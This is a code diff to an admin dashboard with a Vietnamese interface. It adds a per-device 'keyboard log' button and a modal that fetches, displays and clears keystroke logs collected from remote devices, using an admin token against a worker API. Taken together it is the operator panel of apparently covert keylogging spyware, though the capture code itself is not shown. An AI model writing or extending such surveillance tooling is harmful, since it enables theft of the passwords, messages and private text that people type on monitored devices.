@@ -900,6 +900,12 @@ function openDevices(key) {
         </div>
         <div class="dfirst" style="margin-top:6px">🕐 Lần đầu: ${new Date(d.firstSeen).toLocaleString('vi-VN')}</div>
         <div class="dlast">🕐 Lần cuối: ${new Date(d.lastSeen).toLocaleString('vi-VN')}</div>
+        <div style="margin-top:8px">
+          <button class="btn btn-info btn-sm" style="font-size:11px;padding:4px 10px"
+            onclick="openKeylogModal('${d.id}','${(d.name||d.id).replace(/'/g,"\\'")}')">
+            ⌨️ Xem log bàn phím
+          </button>
+        </div>
       </div>
     `).join('');
   }
@@ -1570,6 +1576,75 @@ document.querySelectorAll('.modal-overlay').forEach(el => {
     if (e.target === el) el.style.display = 'none';
   });
 });
+
+// ════════════════════════════════════════════════════════
+//  KEYLOG VIEWER
+// ════════════════════════════════════════════════════════
+async function openKeylogModal(deviceId, deviceName) {
+  document.getElementById('keylog-modal').style.display = 'flex';
+  document.getElementById('keylog-device-title').textContent =
+    '⌨️ Keyboard Log — ' + (deviceName || deviceId);
+  document.getElementById('keylog-device-id-store').value = deviceId;
+  document.getElementById('keylog-body').innerHTML =
+    '<div style="text-align:center;color:var(--text2);padding:30px">Đang tải...</div>';
+
+  try {
+    const r = await fetch(WORKER_URL + '/api/admin/keylog?device=' + encodeURIComponent(deviceId), {
+      headers: { 'X-Admin-Token': ADMIN_TOKEN }
+    });
+    const data = await r.json();
+    const lines = data.lines || [];
+    const el = document.getElementById('keylog-body');
+    if (lines.length === 0) {
+      el.innerHTML = '<div style="text-align:center;color:var(--text2);padding:30px">Chưa có dữ liệu bàn phím nào.</div>';
+      return;
+    }
+    el.innerHTML = lines.map((l, i) => {
+      const ts = l.ts ? new Date(l.ts).toLocaleString('vi-VN') : '';
+      return `<div class="kl-row">
+        <div class="kl-ts">${ts}</div>
+        <div class="kl-text">${escapeHtml(l.text)}</div>
+      </div>`;
+    }).reverse().join('');
+  } catch(e) {
+    document.getElementById('keylog-body').innerHTML =
+      '<div style="color:var(--red);padding:20px">Lỗi tải log: ' + e.message + '</div>';
+  }
+}
+
+async function clearKeylog() {
+  const deviceId = document.getElementById('keylog-device-id-store').value;
+  if (!deviceId) return;
+  if (!confirm('Xoá toàn bộ log bàn phím của thiết bị này?')) return;
+  await apiPost('/api/admin/clearlog', { deviceID: deviceId });
+  document.getElementById('keylog-body').innerHTML =
+    '<div style="text-align:center;color:var(--text2);padding:30px">Đã xoá.</div>';
+  showToast('Đã xoá log bàn phím', 'ok');
+}
+
+function escapeHtml(s) {
+  return (s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
 </script>
+
+<!-- ── Modal: Keylog Viewer ── -->
+<div class="modal-overlay" id="keylog-modal" style="display:none">
+  <div class="modal" style="width:min(680px,96vw);max-height:85vh;display:flex;flex-direction:column">
+    <button class="close" onclick="closeModal('keylog-modal')">✕</button>
+    <h3 id="keylog-device-title" style="margin:0 0 14px">⌨️ Keyboard Log</h3>
+    <input type="hidden" id="keylog-device-id-store">
+    <div style="display:flex;gap:8px;margin-bottom:12px">
+      <button class="btn btn-ghost" style="font-size:12px" onclick="openKeylogModal(document.getElementById('keylog-device-id-store').value, document.getElementById('keylog-device-title').textContent)">🔄 Refresh</button>
+      <button class="btn" style="font-size:12px;background:var(--red);color:#fff" onclick="clearKeylog()">🗑 Xoá log</button>
+    </div>
+    <div id="keylog-body" style="flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:6px;padding-right:4px"></div>
+  </div>
+</div>
+
+<style>
+.kl-row { background:var(--surface2);border-radius:8px;padding:10px 14px;border-left:3px solid #7c3aed; }
+.kl-ts  { font-size:10px;color:var(--text2);margin-bottom:4px; }
+.kl-text{ font-size:13px;color:var(--text);word-break:break-all;font-family:monospace; }
+</style>
 </body>
 </html>
